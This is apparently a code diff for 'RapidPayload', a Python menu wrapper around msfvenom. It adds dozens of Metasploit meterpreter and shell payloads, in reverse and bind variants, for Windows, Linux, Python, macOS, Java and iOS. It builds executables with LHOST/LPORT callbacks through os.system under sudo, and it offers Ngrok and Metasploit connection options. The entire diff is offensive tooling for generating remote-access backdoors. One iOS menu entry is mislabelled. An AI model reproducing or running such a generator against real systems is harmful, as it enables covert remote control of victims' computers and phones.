@@ -35,6 +35,18 @@ def main(platform, type):
         payload= 'windows/meterpreter/reverse_tcp'
         format= 'exe'
         ext= '.exe'
+    if platform == 'Windows' and type == '4':
+        payload= 'windows/meterpreter/bind_tcp'
+        format= 'exe'
+        ext= '.exe'
+    if platform == 'Windows' and type == '5':
+        payload= 'windows/shell/bind_tcp'
+        format= 'exe'
+        ext= '.exe'
+    if platform == 'Windows' and type == '6':
+        payload= 'windows/shell/reverse_tcp'
+        format= 'exe'
+        ext= '.exe'        
     if platform == 'Linux' and type == '1':
         payload= 'linux/x86/meterpreter_reverse_http'
         format= 'elf'
@@ -58,7 +70,31 @@ def main(platform, type):
     if platform == 'Linux' and type == '6':
         payload= 'linux/x64/meterpreter/reverse_tcp'
         format= 'elf'
-        ext= '.elf'                 
+        ext= '.elf'
+    if platform == 'Linux' and type == '7':
+        payload= 'linux/x86/shell/reverse_tcp'
+        format= 'elf'
+        ext= '.elf'
+    if platform == 'Linux' and type == '8':
+        payload= 'linux/x64/shell/bind_tcp'
+        format= 'elf'
+        ext= '.elf'
+    if platform == 'Linux' and type == '9':
+        payload= 'linux/x86/meterpreter/bind_tcp'
+        format= 'elf'
+        ext= '.elf'
+    if platform == 'Linux' and type == '10':
+        payload= 'linux/x64/meterpreter/bind_tcp'
+        format= 'elf'
+        ext= '.elf' 
+    if platform == 'Linux' and type == '11':
+        payload= 'linux/x86/shell/bind_tcp'
+        format= 'elf'
+        ext= '.elf'
+    if platform == 'Linux' and type == '12':
+        payload= 'linux/x64/shell/reverse_tcp'
+        format= 'elf'
+        ext= '.elf'                                                                  
     if platform == 'Python' and type == '1':
         payload= 'python/meterpreter/reverse_http'
         format= 'raw'
@@ -70,7 +106,79 @@ def main(platform, type):
     if platform == 'Python' and type == '3':
         payload= 'python/meterpreter/reverse_tcp'
         format= 'raw'
-        ext= '.py' 
+        ext= '.py'
+    if platform == 'Python' and type == '4':
+        payload= 'python/meterpreter/bind_tcp'
+        format= 'raw'
+        ext= '.py'
+    if platform == 'Macosx' and type == '1':
+        payload= 'osx/x86/shell_reverse_tcp'
+        format= 'macho'
+        ext= '.macho'
+    if platform == 'Macosx' and type == '2':
+        payload= 'osx/x86/shell_bind_tcp'
+        format= 'macho'
+        ext= '.macho'
+    if platform == 'Macosx' and type == '3':
+        payload= 'osx/x64/meterpreter/bind_tcp'
+        format= 'macho'
+        ext= '.bin'
+    if platform == 'Macosx' and type == '4':
+        payload= 'osx/x64/meterpreter/reverse_tcp'
+        format= 'macho'
+        ext= '.bin'
+    if platform == 'Macosx' and type == '5':
+        payload= 'osx/x64/meterpreter_reverse_http'
+        format= 'macho'
+        ext= '.bin'
+    if platform == 'Macosx' and type == '6':
+        payload= 'osx/x64/meterpreter_reverse_https'
+        format= 'macho'
+        ext= '.bin'
+    if platform == 'Java' and type == '1':
+        payload= 'java/meterpreter/reverse_http'
+        format= 'jar'
+        ext= '.jar'
+    if platform == 'Java' and type == '2':
+        payload= 'java/meterpreter/reverse_https'
+        format= 'jar'
+        ext= '.jar'
+    if platform == 'Java' and type == '3':
+        payload= 'java/meterpreter/reverse_tcp'
+        format= 'jar'
+        ext= '.jar'
+    if platform == 'Java' and type == '4':
+        payload= 'java/meterpreter/bind_tcp'
+        format= 'jar'
+        ext= '.jar'
+    if platform == 'Apple_ios' and type == '1':
+        payload= 'apple_ios/aarch64/meterpreter_reverse_http'
+        format= 'macho'
+        ext= '.macho'
+    if platform == 'Apple_ios' and type == '2':
+        payload= 'apple_ios/aarch64/meterpreter_reverse_https'
+        format= 'macho'
+        ext= '.macho' 
+    if platform == 'Apple_ios' and type == '3':
+        payload= 'apple_ios/aarch64/meterpreter_reverse_tcp'
+        format= 'macho'
+        ext= '.macho' 
+    if platform == 'Apple_ios' and type == '4':
+        payload= 'apple_ios/aarch64/shell_reverse_tcp'
+        format= 'macho'
+        ext= '.macho' 
+    if platform == 'Apple_ios' and type == '5':
+        payload= 'apple_ios/armle/meterpreter_reverse_http'
+        format= 'macho'
+        ext= '.macho' 
+    if platform == 'Apple_ios' and type == '6':
+        payload= 'apple_ios/armle/meterpreter_reverse_https'
+        format= 'macho'
+        ext= '.macho' 
+    if platform == 'Apple_ios' and type == '7':
+        payload= 'apple_ios/armle/meterpreter_reverse_tcp'
+        format= 'macho'
+        ext= '.macho'                                                                                                                                         
     print("\033[1m\033[36m")
     os.system('sudo msfvenom -p '+payload+' LHOST='+lhost+' LPORT='+lport+' -f'+format+' -o '+nameFile+ext)
     os.system('sudo chmod +x '+nameFile+ext)
@@ -148,14 +256,14 @@ def MSF():
      
 def RapidP():
     
-    select = input('\n{2}{0}{2}[{1}{2}1{0}]{2}{1} {2}Windows\n{0}{2}[{1}{2}2{2}{0}]{1} {2}Linux\n{0}{2}[{1}{2}3{2}{0}]{1} {2}Android\n{0}{2}[{1}{2}{2}4{0}]{1} {2}Python\n{0}{2}[{1}{2}{2}5{0}]{1} {2}Connect_Ngrok\n{0}{2}[{1}{2}{2}6{0}]{1} {2}Connect_MSF\n{0}{0}[{1}{2}0{0}]{1} {2}Exit\n\n{0}{2}RapidPayload:~#{1} '.format(cyan, end, bold))
+    select = input('\n{2}{0}{2}[{1}{2}1{0}]{2}{1} {2}Windows\n{0}{2}[{1}{2}2{2}{0}]{1} {2}Linux\n{0}{2}[{1}{2}3{2}{0}]{1} {2}Android\n{0}{2}[{1}{2}{2}4{0}]{1} {2}Python\n{0}{2}[{1}{2}{2}5{0}]{1} {2}MacOS\n{0}{2}[{1}{2}{2}6{0}]{1} {2}Java\n{0}{2}[{1}{2}{2}7{0}]{1} {2}Apple_ios\n{0}{2}[{1}{2}{2}8{0}]{1} {2}Connect_Ngrok\n{0}{2}[{1}{2}{2}9{0}]{1} {2}Connect_MSF\n{0}{0}[{1}{2}0{0}]{1} {2}Exit\n\n{0}{2}RapidPayload:~#{1} '.format(cyan, end, bold))
     if select == '1':        
-        type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}windows/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2}windows/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2}windows/meterpreter/reverse_tcp\n{0}[{1}{2}0{0}]{1} {2}Menu\n\n{0}{2}RapidPayload:~/Windows#{1} '.format(cyan, end, bold))
+        type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}windows/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2}windows/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2}windows/meterpreter/reverse_tcp\n{0}[{1}{2}4{0}]{1} {2}windows/meterpreter/bind_tcp\n{0}[{1}{2}5{0}]{1} {2}windows/shell/bind_tcp\n{0}[{1}{2}6{0}]{1} {2}windows/shell/reverse_tcp\n{0}[{1}{2}0{0}]{1} {2}Menu\n\n{0}{2}RapidPayload:~/Windows#{1} '.format(cyan, end, bold))
         if type == '0':
             RapidP()
         main('Windows', type)
     if select == '2':       
-        type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}linux/x86/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2}linux/x86/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2}linux/x86/meterpreter/reverse_tcp{0}{1}\n{0}[{1}{2}4{0}]{1} {2}linux/x64/meterpreter/reverse_http{0}{1}\n{0}[{1}{2}5{0}]{1} {2}linux/x64/meterpreter/reverse_https{0}{1}\n{0}[{1}{2}6{0}]{1} {2}linux/x64/meterpreter/reverse_tcp\n{0}[{1}{2}0{0}]{1} {2}Menu\n\n{0}{2}RapidPayload:~/Linux#{1} '.format(cyan, end, bold))
+        type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}linux/x86/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2}linux/x86/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2}linux/x86/meterpreter/reverse_tcp{0}{1}\n{0}[{1}{2}4{0}]{1} {2}linux/x64/meterpreter/reverse_http{0}{1}\n{0}[{1}{2}5{0}]{1} {2}linux/x64/meterpreter/reverse_https{0}{1}\n{0}[{1}{2}6{0}]{1} {2}linux/x64/meterpreter/reverse_tcp\n{0}[{1}{2}7{0}]{1} {2}linux/x86/shell/reverse_tcp{0}\n{0}[{1}{2}8{0}]{1} {2}linux/x64/shell/bind_tcp\n{0}[{1}{2}9{0}]{1} {2}linux/x86/meterpreter/bind_tcp\n{0}[{1}{2}10{0}]{1} {2}linux/x64/meterpreter/bind_tcp\n{0}[{1}{2}11{0}]{1} {2}linux/x86/shell/bind_tcp\n{0}[{1}{2}12{0}]{1} {2}linux/x64/shell/reverse_tcp\n{0}[{1}{2}0{0}]{1} {2}Menu\n\n{0}{2}RapidPayload:~/Linux#{1} '.format(cyan, end, bold))
         if type == '0':
             RapidP()
         main('Linux', type)
@@ -172,14 +280,28 @@ def RapidP():
                 RapidP()            
             legit('Android', type)            
     if select == '4':
-        type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}python/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2}python/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2}python/meterpreter/reverse_tcp\n{0}[{1}{2}0{0}]{1} {2}Menu\n\n{0}{2}RapidPayload:~/Python#{1} '.format(cyan, end, bold))
-
+        type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}python/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2}python/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2}python/meterpreter/reverse_tcp\n{0}[{1}{2}4{0}]{1} {2}python/meterpreter/bind_tcp\n{0}[{1}{2}0{0}]{1} {2}Menu\n\n{0}{2}RapidPayload:~/Python#{1} '.format(cyan, end, bold))
         if type == '0':
             RapidP()
         main('Python', type)
-    if select == '5':
+    if select == '5':        
+        type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}osx/x86/shell_reverse_tcp\n{0}[{1}{2}2{0}]{1} {2}osx/x86/shell_bind_tcp\n{0}[{1}{2}3{0}]{1} {2}osx/x64/meterpreter/bind_tcp\n{0}[{1}{2}4{0}]{1} {2}osx/x64/meterpreter/reverse_tcp\n{0}[{1}{2}5{0}]{1} {2}osx/x64/meterpreter_reverse_http\n{0}[{1}{2}6{0}]{1} {2}osx/x64/meterpreter_reverse_https\n{0}[{1}{2}0{0}]{1} {2}Menu\n\n{0}{2}RapidPayload:~/MacOS#{1} '.format(cyan, end, bold))
+        if type == '0':
+            RapidP()
+        main('Macosx', type)
+    if select == '6':        
+        type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}java/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2}java/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2}java/meterpreter/reverse_tcp\n{0}[{1}{2}4{0}]{1} {2}java/meterpreter/bind_tcp\n{0}[{1}{2}0{0}]{1} {2}Menu\n\n{0}{2}RapidPayload:~/Java#{1} '.format(cyan, end, bold))
+        if type == '0':
+            RapidP()
+        main('Java', type)
+    if select == '7':        
+        type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}apple_ios/aarch64/meterpreter_reverse_http\n{0}[{1}{2}2{0}]{1} {2}apple_ios/aarch64/meterpreter_reverse_https\n{0}[{1}{2}3{0}]{1} {2}apple_ios/aarch64/meterpreter_reverse_tcp\n{0}[{1}{2}4{0}]{1} {2}apple_ios/aarch64/shell_reverse_tcp\n{0}[{1}{2}5{0}]{1} {2}apple_ios/armle/meterpreter_reverse_http\n{0}[{1}{2}6{0}]{1} {2}apple_ios/armle/meterpreter_reverse_https\n{0}{2}[{1}{2}1{0}]{1} {2}apple_ios/armle/meterpreter_reverse_tcp\n{0}[{1}{2}0{0}]{1} {2}Menu\n\n{0}{2}RapidPayload:~/Apple_ios#{1} '.format(cyan, end, bold))
+        if type == '0':
+            RapidP()
+        main('Apple_ios', type)                          
+    if select == '8':
         Ngrok()
-    if select == '6':
+    if select == '9':
         MSF()                
     elif select == '0':
         print("\n")
